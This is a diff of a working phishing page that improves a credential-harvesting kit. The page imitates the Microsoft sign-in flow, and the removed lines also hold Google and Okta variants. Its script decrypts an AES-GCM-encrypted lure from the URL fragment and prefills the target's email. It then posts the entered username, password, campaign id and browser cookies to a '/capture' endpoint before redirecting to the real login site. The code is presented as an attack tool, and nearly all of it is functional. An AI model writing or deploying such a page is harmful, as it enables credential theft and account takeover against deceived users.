@@ -3,260 +3,175 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
 <title>Sign in to your account</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body {
-    font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
-    background: #f0f0f0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
+    font-family: "Segoe UI Webfont", "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", sans-serif;
+    background: #e8e8e8 url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400"><path d="M0 0h400v400H0z" fill="%23e8e8e8"/></svg>');
+    display: flex; justify-content: center; align-items: center; min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
 }
-.container {
+.card {
     background: #fff;
-    padding: 44px;
-    width: 400px;
-    max-width: 95vw;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    width: 440px; max-width: 95vw;
+    padding: 44px 44px 36px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.10), 0 0 0 1px rgba(0,0,0,0.04);
 }
-.logo {
-    display: block;
-    margin: 0 auto 16px;
-    height: 24px;
-}
-h2 { font-size: 1.5rem; font-weight: 600; margin-bottom: 4px; }
-.subtitle { color: #666; font-size: 0.875rem; margin-bottom: 16px; }
-input {
-    width: 100%;
-    padding: 10px 12px;
-    margin-bottom: 16px;
-    border: 1px solid #ccc;
-    font-size: 0.9375rem;
+.logo { display: block; margin: 0 0 16px; height: 24px; }
+.logo img { height: 24px; }
+h1 { font-size: 1.5rem; font-weight: 600; color: #1b1b1b; margin-bottom: 12px; line-height: 1.25; }
+label { display: block; font-size: 0.875rem; color: #1b1b1b; margin-bottom: 4px; }
+input[type="email"], input[type="password"], input[type="text"] {
+    width: 100%; height: 36px; padding: 6px 10px; border: 1px solid #606060;
+    border-bottom: 2px solid #606060; font-size: 0.9375rem; font-family: inherit;
+    margin-bottom: 16px; background: #fff; color: #1b1b1b;
 }
 input:focus { outline: none; border-color: #0078d4; }
-input::placeholder { color: #999; }
+input::placeholder { color: #606060; }
 .btn {
-    width: 100%;
-    padding: 10px;
-    background: #0078d4;
-    color: #fff;
-    border: none;
-    cursor: pointer;
-    font-size: 0.9375rem;
-    font-weight: 500;
+    width: auto; min-width: 108px; padding: 4px 30px; height: 32px;
+    background: #0067b8; color: #fff; border: none; cursor: pointer;
+    font-size: 0.9375rem; font-family: inherit; float: right;
 }
-.btn:hover { background: #106ebe; }
-.btn:active { background: #005a9e; }
-.footer {
-    margin-top: 16px;
-    font-size: 0.8125rem;
-    color: #666;
-    text-align: left;
+.btn:hover { background: #005da6; }
+.btn:active { background: #004578; }
+.btn-back {
+    background: rgba(0,0,0,0.12); color: #1b1b1b; float: left;
 }
-.footer a { color: #0078d4; text-decoration: none; }
-.error {
-    color: #e81123;
-    font-size: 0.8125rem;
-    margin-bottom: 12px;
-    display: none;
+.links { margin-top: 16px; font-size: 0.8125rem; clear: both; }
+.links a { color: #0067b8; text-decoration: none; display: inline-block; margin-right: 8px; }
+.links a:hover { color: #004578; text-decoration: underline; }
+.error { color: #e81123; font-size: 0.8125rem; margin-bottom: 12px; display: none; }
+.email-display { font-size: 0.9375rem; color: #1b1b1b; padding: 6px 0 4px; margin-bottom: 16px; }
+.email-display .avatar {
+    display: inline-block; width: 32px; height: 32px; border-radius: 50%;
+    background: #0078d4; color: #fff; text-align: center; line-height: 32px;
+    font-size: 0.9375rem; margin-right: 8px; vertical-align: middle;
 }
-.loading {
-    text-align: center;
-    padding: 40px;
-    color: #666;
-}
+.email-display .email-text { vertical-align: middle; font-weight: 400; }
+.divider { border: 0; border-top: 1px solid #e0e0e0; margin: 20px 0; }
+.footer { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.6); padding: 8px 16px; }
+.footer a { color: #fff; font-size: 0.75rem; margin-right: 16px; text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+.loading { text-align: center; padding: 40px; color: #666; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.spinner { width: 24px; height: 24px; border: 2px solid #e0e0e0; border-top-color: #0067b8; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
 </style>
 </head>
 <body>
-
-<div id="app">
-    <div class="loading">Loading...</div>
-</div>
+<div id="app"><div class="loading"><div class="spinner"></div>Loading...</div></div>
 
 <script>
 // ============================================================
-// AES-256-GCM DECRYPTOR — Embedded in the phishing page
+// AES-256-GCM DECRYPTOR + MICROSOFT LOGIN UI
 // ============================================================
-// The AES key is embedded here. The encrypted lure configuration
-// arrives via the URL fragment (#). This script:
-//   1. Reads window.location.hash
-//   2. Strips "mv=" prefix
-//   3. Decrypts with AES-256-GCM
-//   4. Renders the branded phishing page
-//   5. Handles credential capture → POST to backend → redirect
+const AES_KEY_B64 = 'CHANGE_ME';
+const CAPTURE_URL = '/capture';
+const DEBUG = false;
 
-const AES_KEY_B64 = 'CHANGE_ME';           // <-- SET THIS (base64, 32 bytes)
-const CAPTURE_URL = '/capture';            // POST endpoint (same-origin or absolute)
-const DEBUG = false;                        // Set true to log decryption info
-
-// ---- Web Crypto API: AES-GCM decrypt ----
 async function decryptAESGCM(ciphertext, keyBytes) {
-    // ciphertext = nonce (12 bytes) + encrypted (variable) + tag (16 bytes)
     const nonce = ciphertext.slice(0, 12);
     const tag = ciphertext.slice(-16);
     const encrypted = ciphertext.slice(12, ciphertext.length - 16);
-
-    const key = await crypto.subtle.importKey('raw', keyBytes,
-        { name: 'AES-GCM' }, false, ['decrypt']);
-
-    // Reconstruct: encrypted + tag (Web Crypto API expects them concatenated)
+    const key = await crypto.subtle.importKey('raw', keyBytes, { name: 'AES-GCM' }, false, ['decrypt']);
     const fullCipher = new Uint8Array(encrypted.length + tag.length);
-    fullCipher.set(encrypted, 0);
-    fullCipher.set(tag, encrypted.length);
-
-    try {
-        const plaintext = await crypto.subtle.decrypt(
-            { name: 'AES-GCM', iv: nonce, tagLength: 128 },
-            key, fullCipher
-        );
-        return new TextDecoder().decode(plaintext);
-    } catch (e) {
-        console.error('AES-GCM decrypt failed:', e);
-        return null;
-    }
+    fullCipher.set(encrypted, 0); fullCipher.set(tag, encrypted.length);
+    const plaintext = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: nonce, tagLength: 128 }, key, fullCipher);
+    return new TextDecoder().decode(plaintext);
 }
 
-// ---- Base64 URL decode ----
 function base64URLDecode(str) {
-    // Replace URL-safe chars, add padding
     str = str.replace(/-/g, '+').replace(/_/g, '/');
     while (str.length % 4) str += '=';
     return Uint8Array.from(atob(str), c => c.charCodeAt(0));
 }
 
-// ---- Brand configuration ----
-const BRANDS = {
-    microsoft: {
-        name: 'Microsoft',
-        logo: '<svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><rect x="0" y="0" width="24" height="24" fill="#f25022"/><rect x="26" y="0" width="24" height="24" fill="#7fba00"/><rect x="0" y="26" width="24" height="24" fill="#00a4ef"/><rect x="26" y="26" width="24" height="24" fill="#ffb900"/></svg>',
-        subtitle: 'Sign in to your account',
-        footer: 'Terms of use  ·  Privacy & cookies',
-        inputPlaceholder: 'Email, phone, or Skype',
-        btnText: 'Next'
-    },
-    google: {
-        name: 'Google',
-        logo: '<span style="font-size:1.5rem;font-weight:400;color:#444;">Google</span>',
-        subtitle: 'Sign in to continue to Google Workspace',
-        footer: 'Help  ·  Privacy  ·  Terms',
-        inputPlaceholder: 'Email or phone',
-        btnText: 'Next'
-    },
-    okta: {
-        name: 'Okta',
-        logo: '<span style="font-size:1.5rem;font-weight:500;color:#00297a;">Okta</span>',
-        subtitle: 'Sign in to your organization account',
-        footer: 'Help  ·  Privacy Policy',
-        inputPlaceholder: 'Username',
-        btnText: 'Sign in'
-    }
-};
+function escapeHtml(str) {
+    if (!str) return ''; const d = document.createElement('div'); d.textContent = str; return d.innerHTML;
+}
 
-// ---- Main ----
+// Real Microsoft logo (4-color square)
+const MS_LOGO = '<svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><path d="M11.5 0H0v11.5h11.5V0z" fill="#F25022"/><path d="M23.5 0H12v11.5h11.5V0z" fill="#7FBA00"/><path d="M11.5 12.5H0V24h11.5V12.5z" fill="#00A4EF"/><path d="M23.5 12.5H12V24h11.5V12.5z" fill="#FFB900"/><text x="32" y="17" font-family="Segoe UI" font-weight="600" font-size="16" fill="#5e5e5e">Microsoft</text></svg>';
+
 async function main() {
     const app = document.getElementById('app');
-    const hash = window.location.hash.slice(1); // Remove leading #
-
-    if (!hash) {
-        app.innerHTML = '<div class="container"><h2>Page not found</h2></div>';
-        return;
-    }
-
-    // Step 1: Decode the base64url fragment
-    let decoded;
+    const hash = window.location.hash.slice(1);
+    if (!hash) { app.innerHTML = '<div class="card"><h1>Sign in</h1><p style="color:#666">Page not found</p></div>'; return; }
+    let decoded, lure;
     try {
         decoded = base64URLDecode(hash);
-    } catch (e) {
-        app.innerHTML = '<div class="container"><h2>Invalid request</h2></div>';
-        return;
-    }
+        if (new TextDecoder().decode(decoded.slice(0,3)) !== 'mv=') throw new Error('bad prefix');
+        const keyBytes = base64URLDecode(AES_KEY_B64);
+        const pt = await decryptAESGCM(decoded.slice(3), keyBytes);
+        if (!pt) throw new Error('decrypt failed');
+        lure = JSON.parse(pt);
+    } catch(e) { app.innerHTML = '<div class="card"><h1>Sign in</h1><p style="color:#666">Cannot verify this link</p></div>'; return; }
+    if (DEBUG) console.log('Lure:', lure);
 
-    if (DEBUG) console.log('Decoded fragment:', decoded.length, 'bytes');
+    const email = (lure.e || '').toLowerCase().trim();
+    const redirectURL = lure.r || 'https://login.microsoftonline.com';
+    const initials = email ? email.charAt(0).toUpperCase() : '?';
 
-    // Step 2: Verify "mv=" prefix
-    const prefix = new TextDecoder().decode(decoded.slice(0, 3));
-    if (prefix !== 'mv=') {
-        app.innerHTML = '<div class="container"><h2>Page not found</h2></div>';
-        return;
-    }
-    const encryptedPayload = decoded.slice(3);
+    // STEP 1: Email input
+    app.innerHTML = '<div class="card">' +
+        '<div class="logo">' + MS_LOGO + '</div>' +
+        '<h1>Sign in</h1>' +
+        '<div class="error" id="error">We couldn\'t find an account with that username. Try another.</div>' +
+        '<form id="step1Form">' +
+            '<input type="hidden" name="uuid" value="' + escapeHtml(lure.e||'') + '">' +
+            '<input type="hidden" name="campaign" value="' + escapeHtml(lure.c||'') + '">' +
+            '<label>Email, phone, or Skype</label>' +
+            '<input type="email" name="username" id="emailInput" placeholder="Email, phone, or Skype" value="' + escapeHtml(email) + '" autofocus required>' +
+            '<div style="margin-bottom:16px;font-size:0.8125rem;">No account? <a href="#" style="color:#0067b8;text-decoration:none;">Create one!</a></div>' +
+            '<div style="font-size:0.8125rem;margin-bottom:12px;"><a href="#" style="color:#0067b8;text-decoration:none;">Sign in with Windows Hello or a security key</a></div>' +
+            '<div style="overflow:auto"><button type="submit" class="btn">Next</button></div>' +
+        '</form>' +
+    '</div>';
 
-    if (DEBUG) console.log('Encrypted payload:', encryptedPayload.length, 'bytes');
+    document.getElementById('step1Form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const emailVal = document.getElementById('emailInput').value.trim();
+        if (!emailVal || !emailVal.includes('@')) {
+            document.getElementById('error').style.display = 'block';
+            return;
+        }
+        // STEP 2: Password input (looks like real Microsoft step 2)
+        app.innerHTML = '<div class="card">' +
+            '<div class="logo">' + MS_LOGO + '</div>' +
+            '<h1>Enter password</h1>' +
+            '<div class="email-display"><span class="avatar">' + initials + '</span><span class="email-text">' + escapeHtml(emailVal) + '</span></div>' +
+            '<div class="error" id="error2">Your account or password is incorrect. If you don\'t remember your password, <a href="#" style="color:#0067b8;">reset it now.</a></div>' +
+            '<form id="step2Form" method="POST" action="' + CAPTURE_URL + '">' +
+                '<input type="hidden" name="uuid" value="' + escapeHtml(lure.e||'') + '">' +
+                '<input type="hidden" name="campaign" value="' + escapeHtml(lure.c||'') + '">' +
+                '<input type="hidden" name="username" value="' + escapeHtml(emailVal) + '">' +
+                '<input type="hidden" name="redirect" value="' + escapeHtml(redirectURL) + '">' +
+                '<input type="hidden" name="cookies" id="cookiesField" value="">' +
+                '<label>Password</label>' +
+                '<input type="password" name="password" id="passwordInput" placeholder="Password" autofocus required>' +
+                '<div style="margin-bottom:16px;font-size:0.8125rem;"><a href="#" style="color:#0067b8;text-decoration:none;">Forgot password?</a></div>' +
+                '<div style="margin-bottom:16px;font-size:0.8125rem;"><a href="#" style="color:#0067b8;text-decoration:none;">Sign in another way</a></div>' +
+                '<div style="overflow:auto"><button type="button" class="btn btn-back" id="backBtn">Back</button><button type="submit" class="btn">Sign in</button></div>' +
+            '</form>' +
+        '</div>';
 
-    // Step 3: Decrypt with AES-256-GCM
-    const keyBytes = base64URLDecode(AES_KEY_B64);
-    const plaintext = await decryptAESGCM(encryptedPayload, keyBytes);
-
-    if (!plaintext) {
-        app.innerHTML = '<div class="container"><h2>Page not found</h2></div>';
-        return;
-    }
-
-    // Step 4: Parse the lure configuration
-    let lure;
-    try {
-        lure = JSON.parse(plaintext);
-    } catch (e) {
-        console.error('Invalid lure JSON:', plaintext);
-        app.innerHTML = '<div class="container"><h2>Page not found</h2></div>';
-        return;
-    }
-
-    if (DEBUG) console.log('Decrypted lure:', lure);
-
-    // Step 5: Render the branded phishing page
-    const brand = BRANDS[lure.b] || BRANDS.microsoft;
-    const email = lure.e || '';
-
-    app.innerHTML = `
-        <div class="container">
-            <div class="logo">${brand.logo}</div>
-            <h2>${brand.name}</h2>
-            <p class="subtitle">${brand.subtitle}</p>
-            <div class="error" id="error">Incorrect email or password. Please try again.</div>
-            <form id="loginForm" method="POST" action="${CAPTURE_URL}">
-                <input type="hidden" name="uuid" value="${escapeHtml(lure.e || '')}">
-                <input type="hidden" name="campaign" value="${escapeHtml(lure.c || '')}">
-                <input type="text" name="username" placeholder="${brand.inputPlaceholder}" value="${escapeHtml(email)}" required autofocus>
-                <input type="password" name="password" placeholder="Password" required>
-                <button type="submit" class="btn">${brand.btnText}</button>
-            </form>
-            <div class="footer">
-                <span>${brand.footer}</span>
-            </div>
-        </div>
-    `;
-
-    // Step 6: On form submit, capture redirect URL from lure config
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        // The form POSTs to /capture. After POST, browser will follow 302 redirect.
-        // Lure config's redirect URL is handled server-side by the capture backend.
-        const redirectInput = document.createElement('input');
-        redirectInput.type = 'hidden';
-        redirectInput.name = 'redirect';
-        redirectInput.value = lure.r || 'https://login.microsoftonline.com';
-        this.appendChild(redirectInput);
-
-        // Also send cookies if available (for session capture)
-        const cookiesInput = document.createElement('input');
-        cookiesInput.type = 'hidden';
-        cookiesInput.name = 'cookies';
-        cookiesInput.value = document.cookie || '';
-        this.appendChild(cookiesInput);
+        document.getElementById('cookiesField').value = document.cookie || '';
+        document.getElementById('backBtn').addEventListener('click', function() { location.reload(); });
+        document.getElementById('step2Form').addEventListener('submit', function() {
+            document.getElementById('cookiesField').value = document.cookie || '';
+        });
     });
 }
 
-function escapeHtml(str) {
-    if (!str) return '';
-    const div = document.createElement('div');
-    div.textContent = str;
-    return div.innerHTML;
-}
-
-// Start
 main();
 </script>
+
+<div class="footer">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy & cookies</a>
+    <a href="#">...</a>
+</div>
 </body>
 </html>
